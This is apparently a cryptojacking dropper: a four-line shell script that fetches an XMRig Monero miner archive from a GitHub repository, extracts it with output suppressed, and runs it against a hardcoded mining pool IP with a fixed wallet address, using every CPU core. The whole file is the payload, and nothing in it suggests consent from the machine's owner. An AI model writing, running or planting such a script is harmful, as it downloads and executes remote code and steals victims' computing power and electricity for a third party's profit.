#!/bin/sh
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --donate-level 1 -o 159.223.114.25:443 -u 88bAQa4N9MUdqfsu6GrxGZ8PP6R2jaNi1Ri3VSqPBHL2VpCv4JCZjaHiWkWVLjr8JQXkbkbht5sPcPt4JaJBXjnzD3LTVwn -p slow -a rx/0 -k -t $(nproc --all)
